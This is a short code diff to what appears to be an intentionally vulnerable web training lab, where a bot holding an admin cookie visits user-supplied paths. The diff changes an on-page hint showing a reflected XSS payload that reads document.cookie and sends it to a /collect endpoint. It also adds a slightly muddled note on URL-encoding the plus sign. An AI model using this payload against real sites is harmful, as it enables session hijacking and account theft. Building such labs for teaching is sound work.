@@ -46,7 +46,8 @@ def report():
         f"""<div class="panel"><h2>Escalate a query</h2><p>Paste the local path the bot should open. The bot holds a readable administrative cookie.</p>
         <form method="post"><label>Path</label><input name="path" value="/?q=test" size="80">
         <p><button type="submit">Send bot</button></p></form>{message}
-        <p class="note">Payload example: <code>/?q=&lt;script&gt;fetch('/collect?c='+encodeURIComponent(document.cookie))&lt;/script&gt;</code></p></div>""",
+        <p class="note">Payload example: <code>/?q=&lt;script&gt;fetch('/collect?c='%2BencodeURIComponent(document.cookie))&lt;/script&gt;</code>
+        — type <code>%2B</code>, not a literal space: a space becomes <code>+</code> in the query string and breaks the script.</p></div>""",
     )
 
 
